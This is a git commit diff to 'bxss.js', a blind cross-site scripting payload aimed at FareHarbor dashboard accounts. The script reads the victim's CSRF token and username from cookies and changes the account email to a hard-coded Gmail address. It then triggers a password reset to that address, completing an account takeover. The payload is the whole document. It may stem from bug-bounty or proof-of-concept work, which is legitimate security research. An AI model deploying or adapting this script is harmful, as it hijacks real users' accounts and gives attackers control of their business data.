e3d529252b47291c7575795fee28f877262b8743
B15#4L <64602552+abbishal@users.noreply.github.com>
2024-06-19 05:48:46 +0600

    Update bxss.js

--- bxss.js
+++ bxss.js
@@ -1,4 +1,5 @@
 const shortname = 'chinaholidaysaud';
+const attacker_email = "akberbadsha05@gmail.com";
 const csrf = document.cookie.match(/csrftoken=([^;]*)/)[1];
 const username = document.cookie.match(/fh-username=([^;]*)/)[1];
 var xhrg = new XMLHttpRequest();
@@ -11,30 +12,35 @@ xhrg.onload = function() {
     xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
     xhr.setRequestHeader('X-Csrftoken', csrf);
     xhr.setRequestHeader('Referer', 'https://fareharbor.com/'+shortname+'/dashboard/settings/permissions/users/'+username+'/settings/');
-    
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+          console.log('Success:', xhr.responseText);
+        } else {
+          console.error('Error:', xhr.statusText);
+        }
+      };
     // Set the request payload
     xhr.send(JSON.stringify({
       "username": user.username,
       "name": user.name,
       "is_inactive": "activated",
-      "email": "akberbadsha05@gmail.com",
+      "email": attacker_email,
       "group": user.group.pk,
       "partner_group": user.partner_group.pk
     }));
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                console.log('User updated successfully');
-            } else {
-                console.error('Error updating user:', xhr.statusText);
-            }
-        }
-    };
+
     var reset = new XMLHttpRequest();
     reset.open('POST', 'https://fareharbor.com/api/v1/forgot/password/', true);
     reset.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
     reset.setRequestHeader('X-Csrftoken', csrf);
     reset.setRequestHeader('Referer', 'https://fareharbor.com/forgot/password/');
+    reset.onload = function() {
+        if (reset.status === 200) {
+          alert('Password reset email sent to attacker email.');
+        } else {
+          console.error('Error:', reset.statusText);
+        }
+      };
     reset.send(JSON.stringify({
         "shortname": shortname,
         "username": user.username
@@ -45,4 +51,3 @@ xhrg.onload = function() {
   }
 };
 xhrg.send();
-alert('Done');
